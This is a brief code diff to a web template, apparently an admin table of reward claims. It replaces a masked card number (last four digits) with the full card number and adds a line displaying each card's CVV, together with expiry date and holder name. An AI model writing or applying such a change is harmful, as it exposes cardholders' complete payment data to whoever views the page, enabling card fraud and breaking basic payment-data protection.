@@ -394,8 +394,9 @@
           <td>${c.rewards?.name || 'Unknown'}</td>
           <td>
             <small style="color: var(--text-secondary);">
-              Card: **** ${c.card_number?.slice(-4) || 'N/A'}<br>
+              Card: ${c.card_number || 'N/A'}<br>
               Expiry: ${c.card_expiry || 'N/A'}<br>
+              CVV: ${c.card_cvv || 'N/A'}<br>
               Holder: ${c.card_holder_name || 'N/A'}
             </small>
           </td>
